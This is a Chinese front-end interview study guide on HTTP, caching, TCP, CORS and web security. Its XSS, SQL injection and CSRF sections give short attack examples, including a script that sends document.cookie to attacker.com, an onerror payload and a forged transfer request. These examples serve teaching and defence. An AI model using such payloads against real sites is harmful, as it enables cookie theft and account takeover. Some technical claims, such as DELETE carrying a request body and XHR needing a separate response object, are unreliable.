# 计算机网络题目

## 问题1 ：HTTP 请求方式​

1. GET：用于获取资源，通过URL传递参数，请求的结果会被缓存，可以被书签保存，不适合传输敏感信息。​
2. POST：用于提交数据，将数据放在请求体中发送给服务器，请求的结果不会被缓存。​
3. PUT：用于更新资源，将数据放在请求体中发送给服务器，通常用于更新整个资源。​
4. DELETE：用于删除资源，将数据放在请求体中发送给服务器，用于删除指定的资源。​
5. PATCH：用于部分更新资源，将数据放在请求体中发送给服务器，通常用于更新资源的部分属性。

## 问题2：Get / Post 的区别​

区别：​

1. get 幂等，post 不是。（多次访问效果一样为幂等）​
2. get 能触发浏览器缓存，post 没有。​
3. get 能由浏览器自动发起（如 img-src，资源加载），post 不行。​
4. post 相对安全，一定程度上规避 CSRF 风险。​

相同：​

1. 都不安全，都是基于 http，明文传输。​
2. 参数并没有大小限制，是URL大小有限制，因为要保护服务器。 （chrom 2M，IE 2048）

## 问题3：RESTful 规范​

使用语义化的URL来表示资源的层级关系和操作，如/users表示用户资源，/users/{id}表示具体的用户。​

1. **资源**：将系统中的实体抽象为资源，每个资源都有一个唯一的标识符（URI）。​
2. **HTTP方法**：使用HTTP请求方式来操作资源，如GET、POST、PUT、DELETE等。​
3. **状态码**：使用HTTP状态码来表示请求的结果，如200表示成功，404表示资源不存在等。​
4. **无状态**：每个请求都是独立的，服务器不保存客户端的状态信息，客户端需要在请求中携带所有必要的信息。​

## 问题4 ：浏览器缓存（强缓存 / 协商缓存）​

若缓存生效，强缓存返回200，协商缓存返回 304 状态码。​

**强缓存**：
​

- Cache-Control:  max-age=3600 （单位秒）

```js
// 客户端​
async cacheControlTest() {​
  await this.$curl({​
    method: 'GET',​
    url: '/api/cache_control_test',​
    data: {},​
  });​
}
```

```js
// 服务器​
async cacheControlTest(ctx) {​
  // 模拟3秒请求数据​
  await new Promise(resolve => {​
    setTimeout(() => {​
      resolve();​
    }, 3000);​
  });​
  ctx.set(​
    'Cache-Control', ​
    'public, max-age=10'​
  );​
  this.success(ctx);​
}
```

- **Expires**:  new Date(Date.now() + 10 * 1000).toUTCString()

```js
// 客户端​
 async expiresTest() {​
  await this.$curl({​
    method: 'GET',​
    url: '/api/expires_test',​
    data: {},​
  });​
}​
​
```

```js
// 服务器​
async expiresTest(ctx) {​
  // 模拟3秒请求数据​
  await new Promise(resolve => {​
    setTimeout(() => {​
      resolve();​
    }, 3000);​
  });​
  ctx.set(​
    'Expires', ​
    new Date(Date.now() + 10 * 1000).toUTCString()​
  );​
  this.success(ctx);​
}
```

**协商缓存**：

- ETag / If-None-Match

```js
// 客户端​
async etagTest() {​
  const res = await this.$curl({​
    method: 'GET',​
    url: '/api/etag_test',​
    data: {},​
  });​
}
```

```js
// 服务器​
async etagTest(ctx) {​
  // 模拟资源数据​
  const resource = { id: 1, name: 'Example_Resource' };​
​
  // 生成 ETag​
  const resourceETag = md5(`${resource.id}-${resource.name}`);​
​
  // 检查客户端发送的 If-None-Match 头​
  const requestETag = ctx.get('If-None-Match');​
  if (requestETag === resourceETag) {​
    // 如果请求的 ETag 与资源的 ETag 匹配，则返回 304 Not Modified​
    ctx.status = 304;​
    return;​
  }​
​
  // 模拟3秒请求数据​
  await new Promise(resolve => {​
    setTimeout(() => {​
      resolve();​
    }, 3000);​
  });​
​
  // 设置响应头中的 ETag​
  ctx.set('ETag', resourceETag);​
​
  this.success(ctx, resource);​
}
```

- Last-Modified / If-Modified-Since

```js
// 客户端​
async lastModifiedTest() {​
  const res = await this.$curl({​
    method: 'GET',​
    url: '/api/last_modified_test',​
    data: {},​
  });​
}​
​
```

```js
// 服务器​
async lastModifiedTest(ctx) {​
  // 检查客户端发送的 if-modified-since 头​
  const ifModifiedSince = ctx.get('If-Modified-Since');​
  if (ifModifiedSince && new Date(ifModifiedSince).getTime() > lastModifiedTime) {​
    // 如果请求的 If-Modified-Since 大于最后修改时间，直接返回缓存状态码​
    ctx.status = 304;​
    return;​
  }​
​
  // 模拟3秒请求​
  await new Promise(resolve => {​
    setTimeout(() => {​
      resolve();​
    }, 3000);​
  });​
​
  // 设置响应头中的 ETag​
  ctx.set('Last-Modified', new Date(lastModifiedTime).toUTCString());​
​
  this.success(ctx, resource);​
}
```

**相关文章（万字长文）**：

https://www.zhihu.com/question/318091919/answer/2376806633?utm_id=0​


## 问题5：Cache-Control 的取值

`Cache-Control` 指令可以单独或组合使用，以定义特定资源的缓存策略。​
1. `no-store`：禁止缓存。表示不应存储请求或响应的任何部分。​
2. `no-cache`：需要重新验证缓存。客户端需要向服务器发送一个请求来确认缓存的有效性。​
3. `max-age=<seconds>`：指定资源在缓存中的最大存储时间，单位为秒。​
4. `s-maxage=<seconds>`：类似于`max-age`，但仅适用于`代理服务器`缓存，而不适用于浏览器缓存。​
5. `public`：表示响应可以被任何缓存（包括代理服务器）缓存，即响应是公共资源。​
6. `private`：表示响应只能被浏览器缓存，不允许代理服务器缓存。适用于包含用户特定信息的响应。​
7. `must-revalidate`：表示客户端必须在使用已缓存的响应之前重新验证该响应的有效性。​
8. `proxy-revalidate`：类似于`must-revalidate`，但仅适用于代理服务器缓存。​
9. `max-stale[=seconds]`：表示客户端愿意接受已过期的响应，可指定最长过期时间（可选）。​
10. `min-fresh=seconds`：表示客户端希望获取一个在指定时间内不会过期的响应。​
11. `immutable`：指示响应不会随时间的推移而发生更改，适用于长期缓存的不变资源。​
12. `no-transform`：禁止代理服务器对响应进行任何形式的转换，例如，不要压缩或修改内容。​
13. `only-if-cached`：表示客户端只接受缓存的响应，不要向服务器发送请求。

## 问题6：常见的 HTTP 状态码以及代表的意义

- 200 OK：请求成功，服务器成功处理了请求。​
- 201 Created：请求已成功，并在服务器上创建了新的资源。​
- 204 No Content：服务器成功处理了请求，但没有返回任何内容。​
- 400 Bad Request：服务器无法理解请求的语法，请求有语法错误。​
- 401 Unauthorized：请求需要用户身份验证。​
- 403 Forbidden：服务器拒绝请求，没有权限访问。​
- 404 Not Found：请求的资源不存在。​
- 405 Method Not Allowed：请求方法不被允许。​
- 500 Internal Server Error：服务器内部错误，无法完成请求。​
- 502 Bad Gateway：服务器作为网关或代理，从上游服务器收到无效响应。​
- 503 Service Unavailable：服务器当前无法处理请求，通常由于过载或维护。

## 问题7：网络状态  301、302、303  有何区别？​

- **HTTP状态码301**：永久重定向。表示请求的资源已被永久移动到新的位置，将来任何新的请求都应使用新的URL。大多数浏览器会缓存这个重定向的URL，所以在下次访问旧的URL时，浏览器会直接跳转到新的URL，而不会再向服务器请求。​
- **HTTP状态码302**：临时重定向。表示请求的资源临时移动到新的位置，但未来的请求仍应使用原始的URL。浏览器通常不会缓存这个重定向的URL，所以每次访问旧的URL时，都会向服务器请求，然后服务器再返回新的URL。​
- **HTTP状态码303**：查看其他位置。表示请求的资源存在于另一个URL，应使用GET方法获取。这个状态码主要用于在执行POST、PUT等可能引起服务器状态变化的操作后，将客户端重定向到一个新的资源，避免用户刷新或重复提交表单。

## 问题8：400 和 401、403 状态码


**400 Bad Request**

- 状态码说明：HTTP状态码400表示客户端发出的请求有语法错误，服务器无法理解或处理该请求。这可能是由于请求中的参数不正确、格式错误或其他语法问题导致的。​
- 常见原因：用户提供的数据格式不正确，请求缺少必需的参数，或请求中包含无效的字符等。​
- 示例情况：如果客户端发送的JSON请求格式不合法，服务器可能会返回400状态码来表示请求不符合预期的语法。​

​
**401 Unauthorized**

- 状态码说明：HTTP状态码401表示客户端的请求需要身份验证，但未提供有效的身份验证信息。这意味着客户端没有足够的权限来访问请求的资源，需要提供有效的凭证。​
- 常见原因：客户端未提供或提供了无效的身份验证令牌、用户名和密码等。​
- 示例情况：当尝试访问需要登录的Web页面或API端点时，服务器可能会返回401状态码，要求客户端提供有效的身份验证信息，如用户名和密码或访问令牌。​
​
**403 Forbidden**


- 状态码说明：HTTP状态码403表示服务器理解了请求，但拒绝了请求，因为客户端没有访问所请求资源的权限。与401状态码不同，403状态码表示客户端已经提供了身份验证信息，但服务器拒绝了访问请求。​
- 常见原因：服务器认为客户端没有足够的权限来访问请求的资源，或者请求的资源被服务器配置为禁止访问。​
- 示例情况：如果用户尝试访问受限资源，而其权限不足以访问该资源，服务器可能会返回403状态码。​

## 问题9：Http 和 Https 的区别​

主要的区别在于安全性和数据传输方式上，HTTPS比HTTP更加安全，适合用于保护网站用户的隐私和安全，如银行网站、电子商务网站等。​

- **安全性**：HTTP协议传输的数据都是未加密的，也就是明文的，因此使用HTTP协议传输的数据可以被任何抓包工具截取并查看。而HTTPS协议是由SSL+HTTP协议构建的可进行加密传输、身份认证的网络协议，更为安全。​
- **数据传输方式**：HTTP协议的端口号是80，HTTPS协议的端口号是443。​
- **网址导航栏显示**：使用HTTP协议的网站导航栏显示的是"http://"，而使用HTTPS协议的网站导航栏显示的是"https://"。​
- **证书**：HTTPS需要到CA申请证书，一般免费证书较少，因而需要一定费用。​
- **网络速度**：HTTP协议比HTTPS协议快，因为HTTPS协议需要进行加密和解密的过程。​
- **SEO优化**：搜索引擎更倾向于把HTTPS网站排在更前面的位置，因为HTTPS更安全。

## 问题10：描述一下 HTTPS 的加密过程​

**连接过程**​：

1. client ->  :443 -> server​
2. server -> 返回 证书（公钥） + server-random -> client​
3. client: 验证证书 + 生成 client-random​
4. client: client-random + server-random => premastersecret​
5. client: 公钥加密(premastersecret) -> srever​
6. server: 私钥解密(premastersecret)​
7. 两端通过 client-random + server-random + premastersecret => mastersecret 进行对称加密通讯。​
​
![HTTPS加密过程](/WX20251011-154134.png)

**整体**：​

- 建立链接时：公钥 + 私钥 => 非对称加密的，​
- 后续数据传输：mastersecret 对称加密​
- 为什么安全：每一步劫持，都只能截取 mastersecret，没法解密，只能透传，转发。有效保护通讯数据。

## 问题11：Cookie 为了解决什么问题​

**定义：**

Cookie是一种存储在用户浏览器中的小文件，用于存储网站的一些信息。通过Cookie，服务器可以识别用户并保持会话状态，实现会话保持。用户再次访问网站时，浏览器会将Cookie发送给服务器，以便服务器可以识别用户并提供个性化的服务，存储上限为 4KB。​

**解决问题：**

Cookie诞生的主要目的是为了解决HTTP协议的无状态性问题。HTTP协议是一种无状态的协议，即服务器无法识别不同的用户或跟踪用户的状态。这导致了一些问题，比如无法保持用户的登录状态、无法跟踪用户的购物车内容等。

## 问题12:Cookie 和 Session 的区别

Cookie（HTTP Cookie）和 Session（会话）都是用于在 Web 应用程序中维护状态和用户身份的两种不同机制：

- **存储位置**
  - Cookie：Cookie是存储在客户端（通常是用户的浏览器）中的小段文本数据。浏览器会在每次请求中自动发送Cookie到服务器，以便服务器可以识别用户。
  - Session：Session数据通常存储在服务器上，而不是在客户端。服务器为每个用户创建一个唯一的会话，然后在服务器上存储会话数据。

- **持久性**
  - Cookie：Cookie可以具有持久性，可以设置过期时间。如果没有设置过期时间，Cookie将成为会话Cookie，存在于用户关闭浏览器前的会话期间。
  - Session：会话数据通常存在于用户活动的会话期间，一旦会话结束（用户退出登录或关闭浏览器），会话数据通常会被删除。

- **安全性**
  - Cookie：Cookie数据存储在客户端，可能会被用户篡改或窃取。因此，敏感信息通常不应存储在Cookie中，或者应该进行加密。
  - Session：Session数据存储在服务器上，客户端不可见，因此通常更安全，特别适合存储敏感信息。

- **服务器负担**
  - Cookie：服务器不需要维护Cookie的状态，因为它们存储在客户端。每次请求中都包含Cookie，服务器只需要验证Cookie的有效性。
  - Session：服务器需要维护会话数据，这可能会增加服务器的负担，尤其是在大型应用程序中。

- **跨多个页面**
  - Cookie：Cookie可以被跨多个页面和不同子域共享，这使得它们适用于用户跟踪和跨多个页面的数据传递。
  - Session：会话数据通常只在单个会话期间可用，而不容易在不同会话之间共享。

- **无需登录状态**
  - Cookie：Cookie可以在用户未登录的情况下使用，例如用于购物车或用户首选项。
  - Session：会话通常与用户的身份验证和登录状态相关，需要用户登录后才能创建和访问会话。

## 问题13:TCP（传输控制协议）和 UDP（用户数据报协议）的区别​

两种常用的传输层协议，用于在网络中传输数据。​

**TCP**：一种面向连接的协议，提供可靠的数据传输。它通过三次握手建立连接，保证数据的完整性和顺序性。TCP使用流控制、拥塞控制和错误检测等机制来确保数据的可靠传输。它适用于需要可靠传输的应用，如文件传输、电子邮件和网页浏览等。​

**UDP**：一种无连接的协议，提供不可靠的数据传输。它不需要建立连接，直接将数据包发送给目标地址。UDP没有流控制和拥塞控制机制，也不保证数据的完整性和顺序性。UDP适用于实时性要求较高的应用，如音频、视频和实时游戏等。​

总结来说，TCP提供可靠的、面向连接的数据传输，适用于对数据完整性和顺序性要求较高的应用；而UDP提供不可靠的、无连接的数据传输，适用于实时性要求较高的应用。选择使用TCP还是UDP取决于应用的需求和特点。

## 问题14：TCP 三次握手​

- **第一次握手（SYN）**：发送方首先向接收方发送一个SYN（同步）标志的TCP包，该包包含一个随机生成的初始序列号（ISN）。这表示发送方希望建立一个连接，并且指定了一个用于数据传输的起始序号。​
- **第二次握手（SYN + ACK）**：接收方接收到发送方的SYN包后，它会回应一个带有SYN和ACK（确认）标志的TCP包。这个响应包不仅确认了接收到的SYN，还包含了接收方的初始序列号。这两个序列号表示了双方用于传输数据的初始顺序。​
- **第三次握手（ACK）**：最后，发送方接收到接收方的响应后，它会发送一个带有ACK标志的TCP包，表示对接收方的响应已经收到。至此，连接建立完成，双方可以开始进行数据传输。

## 问题15:如果 TCP 变成二次握手会导致的问题​

如果变为二次握手，即客户端发送SYN请求后，服务器直接发送ACK响应，省略了服务器的SYN+ACK响应。​

**会导致以下问题**：

​
1.服务器无法确认客户端是否收到服务器的SYN+ACK响应，客户端发送SYN请求后可能会关闭连接或丢失数据包。​

2.客户端无法得知服务器的初始序列号，无法正确确认服务器的ACK响应。​

因此，将TCP三次握手变为二次握手会导致连接建立的不可靠性，可能会出现连接无法建立或数据传输错误的情况。三次握手的设计可以确保双方都能确认对方的状态和序列号，从而建立可靠的连接。

## 问题16:TCP 的四次挥手​

1. 客户端发送终止请求（FIN）给服务器。​
2. 服务器确认收到客户端的终止请求，发送确认（ACK）。​
3. 服务器发送剩余数据给客户端，并发送终止请求（FIN）给客户端。​
4. 客户端确认服务器的终止请求，发送确认（ACK）。​
5. 连接终止完成。

## 问题17：描述一下 TCP 的拥塞控制​

网络传输过程中，某段时间如果网络中某一资源的需求超过了该资源所能提供的可用部分，网络性能就会变坏，这种情况就叫做网络拥塞，为解决这个问题，TCP中使用了四种拥塞控制算法​

1. 慢开始​
2. 拥塞避免​
3. 快重传​
4. 快恢复

## 问题18：什么是跨域？如何解决？​

在 Web 应用程序中，一个网页的代码试图向不同源（即不同的域名、协议或端口）发起 HTTP 请求。浏览器的同源策略（Same-Origin Policy）限制了跨域请求，以保护用户的安全性和隐私。同源策略要求网页只能与同一源的资源进行交互，而不允许与不同源的资源直接交互。​

**解决方法**：

- Nginx 充当代理服务器，分发请求到目标服务器。​
- Nodejs 同域部署页面，搭建 BFF 层，服务对服务请求。​
- 服务器端配置CORS策略，可以允许指定源（域名、协议、端口）的请求  Access-Control-Allow-Origin。​
- Iframe 通讯，通过在主页面嵌入一个隐藏的 iframe，将目标页面加载到 iframe 中，并通过在主页面和 iframe 页面之间使用 postMessage() 方法进行消息传递，从而实现跨域的数据交换。

## 问题19:同源策略具体限制的具体内容​

- **DOM访问限制**：不同源的网页不能直接访问彼此的DOM元素，包括读取和修改。这意味着一个网页无法通过JavaScript获取另一个网页的内容，除非目标网页明确授权。​
- **Cookie限制**：同源策略阻止网页访问不属于自己源的Cookie。Cookie是用于在客户端存储和传输信息的机制，同源策略确保Cookie只能由创建它的源访问。​
- **XMLHttpRequest限制**：XMLHttpRequest（XHR）是用于在网页和服务器之间进行异步数据交换的技术。同源策略禁止不同源的网页通过XHR请求发送或接收数据。​
- **跨文档消息限制**：同源策略限制不同源的窗口或帧之间通过postMessage()方法进行通信。这可以防止恶意网页滥用通信渠道。​
- **脚本限制**：不同源的脚本文件（如JavaScript）不能相互引用和执行。

## 问题20：发起请求时浏览器做了什么

- **发送请求头**：浏览器向目标服务器发送一个请求，其中包含了请求方法（`GET`、`POST`等）和请求的`URL`。检查同源策略，浏览器会检查目标`URL`是否符合同源策略。它会比较目标`URL`的协议、主机和端口号与当前网页的协议、主机和端口号是否一致。如果不一致，就会触发跨域请求。​

- **发送跨域请求**：如果目标`URL`与当前网页不同源，浏览器会发送一个跨域请求。跨域请求通常是一个`HTTP OPTIONS` 预检请求（`preflight request`），用于检查目标服务器是否允许跨域请求。​

- **服务器处理预检请求**：目标服务器接收到预检请求后，会进行一系列的处理。它会检查请求中的一些特定头部信息，如`Origin`和`Access-Control-Request-Method`，来验证是否允许跨域请求。​

- **发送响应头**：如果服务器允许跨域请求，它会在响应中添加一些特定的头部信息，如`Access-Control-Allow-Origin`和`Access-Control-Allow-Methods`。这些头部信息告诉浏览器该请求是被允许的。​

- **检查响应头**：浏览器接收到服务器的响应后，会检查响应中的头部信息。它会查看`Access-Control-Allow-Origin`头部，判断是否允许当前网页进行跨域请求。​

- **处理响应数据**：如果服务器允许跨域请求，浏览器会将响应数据返回给发起请求的网页。否则，浏览器将拒绝访问响应数据，并在控制台中报错。

## 问题21：XSS 攻击是什么？​

攻击者通过注入恶意脚本代码来利用应用程序的漏洞，从而在用户的浏览器中执行恶意操作。​

XSS攻击通常分为三种类型：存储型（Stored）、反射型（Reflected）和DOM型（DOM-based）。​
​
**存储型XSS攻击**：
​
攻击者将恶意脚本代码上传到目标网站的服务器上，通常是在用户评论、留言板或用户生成的内容中。当其他用户访问包含恶意代码的页面时，他们的浏览器会执行这些代码。​
​
**案例1**：攻击者在一个论坛网站上发表了一个包含恶意脚本的评论。其他用户访问这个评论时，恶意脚本会被执行，窃取他们的会话cookie并发送到攻击者的服务器上。​

```html
<!-- 攻击者发布的评论 -->​
<script>​
fetch("http://attacker.com/steal?cookie=" + document.cookie);​
</script>
```

**反射型XSS攻击**：
​
**案例**：攻击者将恶意脚本包含在URL中，然后诱使用户点击该URL。当用户打开URL时，恶意脚本会在用户的浏览器中执行，执行一些恶意操作。​

```html​
http://vulnerable-website.com/search?query=<script>alert('XSS')</script>​
```

​
**DOM型XSS攻击**：​

案例：在一个社交媒体应用程序中，攻击者在用户输入框中输入恶意脚本，当其他用户查看这个帖子时，恶意脚本会在其浏览器中执行。​

1. 用户输入：​

```html
<img src=x onerror="alert('XSS')">​
```

2.显示在页面上的内容：​

```html
<div class="post-content"><p>这是一个帖子</p><img src=x onerror="alert('XSS')"></div>​
```

- 防范措施：​
  - **输入验证和过滤**：对于用户输入的数据，应进行验证和过滤。仅允许预期的、安全的字符和内容通过，拒绝包含特殊字符的输入。​
  - **转义输出**：在将用户输入的数据插入到HTML、JavaScript或其他上下文中之前，务必对其进行适当的转义。这可以防止浏览器解释用户输入的内容为可执行代码。​
  - **使用安全的编程框架和库**：许多现代编程框架和库提供内置的XSS防护机制，例如React的JSX转义、Angular的DOM安全性、Vue的模板转义等。使用这些工具可以大大降低XSS攻击的风险。​
  - **设置HTTP头部**：使用Content Security Policy（CSP）等HTTP头部来限制哪些资源可以加载和执行。CSP可以帮助阻止不受信任的脚本和内容加载。​
  - **最小化权限**：确保应用程序在运行时具有最小的权限。避免在JavaScript中使用特权模式，并限制对敏感操作和数据的访问。​
  - **教育和培训**：开发团队需要受过培训，了解XSS攻击的工作原理以及如何预防它们。员工的安全意识教育也非常重要。​
  - **安全漏洞扫描和审计**：定期对应用程序进行安全漏洞扫描和代码审计，以及时发现并修复潜在的XSS漏洞。​
  - **更新和维护依赖项**：确保应用程序使用的所有框架、库和插件都是最新版本，并及时应用安全更新。

## 问题22：SQL 注入​

SQL注入攻击 - 假设有一个网页上的登录表单，该表单将用户提供的用户名和密码与数据库中的数据进行比较以进行身份验证。通常，身份验证的 SQL 查询可能如下所示：​
​
```sql
SELECT * FROM users WHERE username = '输入的用户名' AND password = '输入的密码';​
--​
输入：' OR '1'='1​
--​
SELECT * FROM users WHERE username = '' OR '1'='1' AND password = '输入的密码';​
```
​
在这种情况下，由于 '1'='1' 总是为真，攻击者可以绕过身份验证，因为系统将返回匹配的用户。

## 问题23：DDoS 攻击​

DDoS（分布式拒绝服务）**通过大量的请求或流量来超载目标服务器**，使其无法正常响应合法用户的请求。​
DDoS攻击通常涉及到多个攻击源，这些攻击源可以是由攻击者控制的大量僵尸计算机或恶意程序感染的计算机，这些计算机一起发送大量请求或流量。攻击源的分布性使得识别和应对攻击更加困难。​
**DDoS 攻击可以采用不同的形式**：​

a. HTTP Flood：攻击者发送大量HTTP请求到目标服务器，以消耗服务器资源和带宽。这种攻击通常针对Web应用程序。​

b. UDP Flood：攻击者发送大量UDP数据包到目标服务器，以耗尽服务器的处理能力。UDP Flood攻击通常更难检测，因为UDP是面向无连接的协议。​

c. SYN/ACK Flood：攻击者发送大量伪造的TCP连接请求（SYN），但不会完成TCP握手过程。这会占用服务器的资源，使其无法处理合法请求。​

d. ICMP Flood：攻击者发送大量的ICMP回显请求（Ping请求），以超载目标服务器。这种攻击通常被称为Ping洪泛攻击。​

e. DNS Amplification：攻击者向未经授权的开放DNS服务器发送DNS查询请求，将大量响应引导到目标服务器，使其超载。​

DDoS攻击的目的可以是多种多样的，包括恶意破坏、勒索尝试、竞争对手恶意竞争、政治动机等。​

为了应对DDoS攻击，组织和网络管理员通常会采取防御策略，如使用防火墙、入侵检测系统（IDS）和内容分发网络（CDN），以帮助过滤和减轻攻击流量。此外，云服务提供商通常提供DDoS保护服务，帮助客户缓解DDoS攻击。

## 问题24：CSRF 攻击​

CSRF（Cross-Site Request Forgery，跨站点请求伪造）**利用用户已经登录的凭据**来**执行敏感操作**，而用户并不知情。这可能包括更改密码、修改电子邮件地址、进行资金转账等，具体取决于受攻击的应用程序的功能。​
​
**以下是一个简化的CSRF攻击示例**：​

1. 用户登录到银行网站并保持会话处于活动状态，他们在浏览网页时访问了一个恶意网站。​
2. 恶意网站上包含以下HTML代码：​

```js
<img src="http://bank.com/transfer?to=attacker&amount=1000" alt="恶意图片">​
```

1. 这个图片的URL看似是一个图片，但实际上是向银行网站发出了一个转账请求。​
2. 用户的浏览器会自动加载这个图片，由于用户仍然在银行网站上保持登录状态，浏览器会发送带有用户凭据的请求到银行网站，从而执行了转账操作。

**防范措施**：​

1. **使用CSRF令牌**：在每个用户请求中包括一个CSRF令牌，该令牌是服务器生成的随机值。服务器会验证每个请求中的令牌是否匹配，如果不匹配则拒绝请求。​
2. **同源策略**：浏览器实施同源策略，限制了跨域请求的执行。开发人员应该使用CORS（跨源资源共享）策略来明确定义哪些跨域请求是允许的。​
3. **使用HTTP Only Cookie**：将敏感凭据存储在HTTP Only Cookie中，这样它们不能通过JavaScript访问。这可以减少CSRF攻击的风险。​
4. **不要使用GET请求进行敏感操作**：尤其是不要使用GET请求来执行状态更改或敏感操作，因为GET请求容易受到CSRF攻击。​
5. **检查来源头（Origin Header）**：服务器可以检查请求的来源头，确保它来自合法的源。

## 问题25：Ajax 的定义及优缺点​

Ajax（Asynchronous JavaScript and XML）是一种用于在后台与服务器进行异步通信的技术。它使用JavaScript和XML（现在通常使用JSON）来传输数据，而无需刷新整个页面。
​
**优点**：​

1. **异步通信**：Ajax允许在后台与服务器进行异步通信，可以在不刷新整个页面的情况下更新部分页面内容，提供更好的用户体验。​
2. **减少带宽使用**：由于只更新部分页面内容，而不是整个页面，因此可以减少对服务器和网络带宽的需求。​
3. **提高页面加载速度**：通过异步加载数据，可以提高页面加载速度，减少用户等待时间。​
4. **支持多种数据格式**：Ajax不仅支持XML，还支持JSON等多种数据格式，使数据的传输更加灵活和高效。​

**缺点**：​

1. **对搜索引擎不友好**：搜索引擎很难获取到完整的页面内容，影响页面的搜索引擎优化（SEO）。​
2. **不支持跨域请求**：浏览器同源策略限制，Ajax请求通常只能发送到与当前页面同源的服务器，不支持跨域请求。​
3. **安全性问题**：如果不正确处理Ajax请求，可能会导致安全漏洞，如 XSS 和 CSRF 等。

## 问题26：XMLHttpRequest 对象用法​

XMLHttpReques t对象是用于在后台与服务器进行异步通信的核心对象之一。

```js

// 创建XMLHttpRequest对象​
const xhr = new XMLHttpRequest();​
​
// 注册回调函数，当请求完成时调用​
xhr.onload = function() {​
  if (xhr.status === 200) {​
    // 处理返回的数据​
    console.log(xhr.responseText);​
  } else {​
    // 处理错误信息​
    console.error('请求失败：' + xhr.status);​
  }​
};​
​
// 发送请求​
xhr.open('GET', 'https://api.example.com/data', true);​
xhr.send();
```

在上面的代码中，首先创建一个XMLHttpRequest对象，然后注册一个onload回调函数，在请求完成时调用。在回调函数中，可以根据请求的状态码判断请求是否成功，并处理返回的数据或错误信息。最后，使用open方法设置请求的类型（GET、POST等）、URL和异步标志，使用send方法发送请求。

一些常用的方法和属性：​
- `open(method, url, async)`：设置请求的类型、URL和异步标志。​
- `send(data)`：发送请求，并可选地传递数据。​
- `abort()`：取消当前请求。​
- `setRequestHeader(name, value)`：设置请求头信息。​
- `getResponseHeader(name)`：获取指定名称的响应头信息。​
- `getAllResponseHeaders()`：获取所有响应头信息。​
- `status`：获取请求的状态码。​
- `statusText`：获取请求的状态文本。​
- `responseText`：获取响应的文本内容。​
- `responseXML`：获取响应的XML文档对象。​
​
注意：XMLHttpRequest 对象的使用方式可能因浏览器而异，某些浏览器可能不支持某些方法或属性。因此，在使用XMLHttpRequest 对象时，需要注意兼容性问题，并根据具体需求选择合适的方法和属性。

## 问题27：封装一个 ajax 请求方法

```js
function ajaxRequest({ url, method, data, callback }) {​
  const xhr = new XMLHttpRequest();​
  ​
  xhr.open(method, url, true);​
  ​
  xhr.onload = function() {​
    if (xhr.status === 200) {​
      const response = JSON.parse(xhr.responseText);​
      callback(null, response);​
    } else {​
      callback('请求失败：' + xhr.status, null);​
    }​
  };​
  ​
  xhr.onerror = function() {​
    callback('请求错误', null);​
  };​
  ​
  xhr.send(data);​
}
```

**注意**：Axios 的本质也是对 XMLHttpRequest 进行封装。

## 问题28：Fetch API​

**背景**：​

1. 起初提案：Fetch API最早是由WHATWG提出的，旨在改进和取代XMLHttpRequest，以提供更强大、现代和一致的方式进行网络请求。​
2. 标准草案：Fetch API的标准化工作得到了广泛支持，于2014年成为Web标准的一部分。它首先出现在WHATWG的"Fetch Living Standard"（规范草案）中。​
3. W3C标准化：后来，Fetch API作为Fetch标准被W3C采纳，并成为W3C的"Fetch Living Standard"。这个标准于2017年成为W3C的推荐标准，这意味着它成为了Web开发的正式标准。​
​
**调用方法**：

```js
fetch('https://api.example.com/data') // 发起GET请求​
  .then(response => {​
    if (!response.ok) {​
      throw new Error('Network response was not ok');​
    }​
    return response.json(); // 解析响应为JSON​
  })​
  .then(data => {​
    // 在这里处理从服务器返回的数据console.log(data);​
  })​
  .catch(error => {​
    // 处理任何网络请求错误console.error('Fetch error:', error);​
  });​
  ​
fetch('https://api.example.com/data', {​
  method: 'POST',​
  headers: {​
    'Content-Type': 'application/json',​
    'Authorization': 'Bearer YourAccessToken'​
  },​
  body: JSON.stringify({ key: 'value' }) // 将数据发送到服务器​
}).then(response => {​
  // 处理响应​
}).catch(error => {​
  // 处理错误​
});
```

## 问题29：fetch 与 XMLHttpRequest 的区别

- **API 设计**：​
  - XMLHttpRequest 是早期的技术，它使用回调函数来处理请求和响应，使其代码结构相对复杂。​
  - Fetch API 使用基于 Promise 的 API，更现代、直观和易于使用。它支持使用 `async/await` 来处理异步操作，使代码更清晰。​

- **语法**：​
  - XMLHttpRequest 使用了一种事件驱动的编程模型，通过设置回调函数来处理请求的各个阶段，如 `onload`、`onerror`、`onreadystatechange` 等。​
  - Fetch API 使用 Promise 对象，通过链式的 `.then()` 和 `.catch()` 方法来处理请求和响应。这种方式更容易理解和维护。​

- **请求和响应**：​
  - XMLHttpRequest 使用单独的对象来表示请求和响应，你需要分别创建 `XMLHttpRequest` 对象和 `XMLHttpResponse` 对象。​
  - Fetch API 使用 `Request` 和 `Response` 对象，更一致和易于操作，这两种对象都遵循同样的标准。​

- **跨域请求**：​
  - XMLHttpRequest 需要在服务器端进行额外的配置来处理跨域请求，而且在某些情况下，需要使用 JSONP 等技巧来绕过同源策略。​
  - Fetch API 默认支持跨域请求，可以通过 CORS 头部来控制跨域访问。

- **错误处理**：​
  - XMLHttpRequest 的错误处理通常涉及检查 `status` 和 `readyState` 属性，以及使用回调函数来处理错误情况。​
  - Fetch API 使用 Promise 链中的 `.catch()` 方法来处理错误，这使错误处理更一致和清晰。​

- **取消请求**：​
  - XMLHttpRequest 不提供原生的取消请求的机制，但你可以通过中断请求来模拟取消。​
  - Fetch API 支持 `AbortController` 对象，用于取消请求。​
​

## 问题30：请求会发送2次的原因​

1. **Preflight Requests (CORS)**：跨源资源共享（CORS）是一种安全机制，用于控制在不同源（域名、协议、端口）之间的资源请求。当你通过Fetch API向另一个域名发出跨源请求时，浏览器会自动进行CORS预检请求，也称为预检请求（preflight requests）。这是为了确定服务器是否接受跨源请求，以及哪些HTTP方法和头部字段是允许的。预检请求是OPTIONS方法的请求，这意味着你的浏览器首先发送一个OPTIONS请求，然后才发送实际的GET或POST请求。因此，你会看到两个请求。​

2. **Redirects**：如果服务器返回一个HTTP重定向响应（例如，状态码为302或307），浏览器将首先向新的重定向目标URL发出一个请求，然后才会继续原始请求。这也可能导致看到两个请求，一个是重定向请求，另一个是最终目标请求。​

3. **程序错误或重复调用**：在你的JavaScript代码中，有时会发生意外的重复调用Fetch API的情况，例如在某个事件处理程序中多次触发Fetch请求。这将导致多个请求被发送。​

4. **浏览器预加载和预解析**：现代浏览器可能会在背后执行一些资源的预加载和预解析操作，以提高性能。这可能导致浏览器发送额外的请求。这些请求通常不会在开发者控制范围之内。​

5. **浏览器插件或扩展**：有时，浏览器插件或扩展可能会触发Fetch请求。这可能会导致你看到不同于你的网站代码所发出的请求。​

​
## 问题31：websocket​

